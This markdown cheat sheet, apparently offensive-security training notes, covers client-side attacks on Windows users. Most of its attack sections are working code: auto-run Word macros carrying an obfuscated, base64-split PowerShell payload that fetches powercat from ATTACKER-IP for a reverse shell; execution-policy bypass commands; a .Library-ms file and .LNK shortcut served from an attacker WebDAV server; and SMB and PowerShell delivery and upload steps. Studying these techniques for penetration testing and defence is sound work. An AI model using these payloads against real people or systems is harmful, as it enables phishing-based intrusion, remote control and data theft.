# Client side attacks

## About

Client-side attacks often exploit weaknesses or functions in local software and applications such as browsers, operating system components, or office programs.

Client-side attacks often use specific delivery mechanisms and payload combinations, including email attachments or links to malicious websites or files.

lient-side attacks often must deliver payload to a target on a non-routable internal network, since client systems are rarely exposed externally.

[Windows default libraries in User folder](https://learn.microsoft.com/en-us/windows/client-management/client-tools/windows-libraries#default-libraries-and-known-folders)


## Offline Metadata Recon

* Read meta data of file with `exiftool`
* -a allow duplicates
* -u unknown file tags

```bash
# Find, Downlaod and read Metadata
gobuster dir -u http://target.com/ -x pdf -w /usr/share/wordlists/dirb/common.txt
curl -O http://target.com/some.pdf
exexiftool -a -u some.pdf
```

## Fingerprint Offline Machines

* Let's send an cannary token link to the target
* Provide information about the browser, IP and more
* Navigate to `https://canarytokens.com`
* Select `Web Bug / URL token`
* Provide email and name
* Copy link and send to target

More tools:

* [FingerprintJS](https://github.com/fingerprintjs/fingerprintjs/tree/master?tab=readme-ov-file)
* [Grabify IP Logger](https://grabify.link/)
* [What is my Browser](https://explore.whatismybrowser.com/useragents/parse/)
* [Harvester requires API keys](https://github.com/laramies/theHarvester)
* [DNS Search](https://searchdns.netcraft.com/)

## Office Word Macros

* Open Word file
* Save File as ".doc" (2000)
* Add macros and select the .doc file

Test

```vb
Sub AutoOpen()
  MyMacro
End Sub

Sub Document_Open()
  MyMacro  
End Sub

Sub MyMacro()
  CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

Reverse Shell with Powercat

* prepare download `cat powercat.ps1; python3 -m http.server 80`
* prepare listener `nc -nvlp 4444`
* prepare download macro using pyhton and VBA
  * prepare powercat reverse shell
  * encode utf-8 and base64
  * split the base64 string

```powershell
$Shell= "IEX (New-Object System.Net.WebClient).DownloadString('http://ATTACKER-IP/powercat.ps1');powercat -c ATTACKER-IP -p 4444 -ep"
$Base64Shell = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Shell))
python3 ./tools/split-vb-pwsh-command.py $Base64Shell
```

```python
#!/usr/bin/python3
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
n = 50
for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```

```vb
Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A=="

CreateObject("Wscript.Shell").Run Str
End Sub
```

Allow Powershell Execution

```powershell
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force;
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force;
```

## Windows Libraries

* File Extension `.Library-ms`
* Default location for Library description file `%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Libraries`
* [Folder Redirection](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh848267(v=ws.11))

Staged-Attack:

* Foothold - Create a Windows library `config.Library-ms` for our victim
* Victim receives a .Library-ms file, double-click looks like folder structure
* Attack - Create a .LNK file served by WebDAV server that executes a Reverse Shell
* Victim execution the .LNK file

Setup WebDAV server to host .LNK files (via Windows Library)

* --host listener IP
* --port listener Port
* --auth anoymous
* --root server folder

```bash
sudo apt install python3-wsgidav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

1st Stage - Create a Windows library `config.Library-ms`

* [Format Definition](https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry)
* [Folder Types](https://learn.microsoft.com/en-us/windows/win32/shell/schema-library-foldertype)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<!-- We can use @shell32.dll,-34575 or @windows.storage.dll,-34582 as specified on the Microsoft website. Choose the latter because shell32.dll looks to suspecious-->
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<!-- Navigation bar and Icon. We can use imagesres.dll to choose between all Windows icons.  
<iconReference>imageres.dll,-1002</iconReference> Documents folder icon.
<iconReference>imageres.dll,-1003</iconReference> Pictures folder icon. 
-->
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<!-- Document Folder Type
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType> Documents or
<folderType>{B3690E58-E961-423B-B687-386EBFD83239}</folderType> Pictures
-->
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<!--
Attention: 
The URL is important part and it must be set once per execution.
After execution the file gets manipulated by Windows.
-->
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://ATTACKER-IP</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>

</libraryDescription>
```

2nd Stage - Create a .LNK file served by WebDAV server

* Create a shortcut with a Path
* Add Powercat Reverse Shell as Payload
* 

```
powershell.exe -c "IEX (New-Object System.Net.WebClient).DownloadString('http://Attacker-IP:8000/powercat.ps1');powercat -c Attacker-IP -p 4444 -ep"
```

Upload Windows Library Delivery via SMB

* Upload  library via `smbclient` to a public share
* Another way is an E-Mail attachment
* Both methods will require a pretext

```bash
smbclient //TARGET-IP/share -c 'put config.Library-ms'
```

Upload Windows Library Delivery via WebDav

* Use Windows Built-In `net use`
* Connect to a WebDAV share

```powershell
# Windows
net use w: http://ATTACKER-IP/
copy uploadfile w:\
net use w: /delete
```

Upload Windows library via powershell

* Precondition: HTTP webserver single file uploads
* kali-install-tool.md -> Install HTTP Upload Server -> Patch

```powershell
$response=(New-Object Net.WebClient).UploadFile('http://Attacker-IP/upload', '.\Desktop\uploadfile'); [Text.Encoding]::UTF8.GetString($response)
```
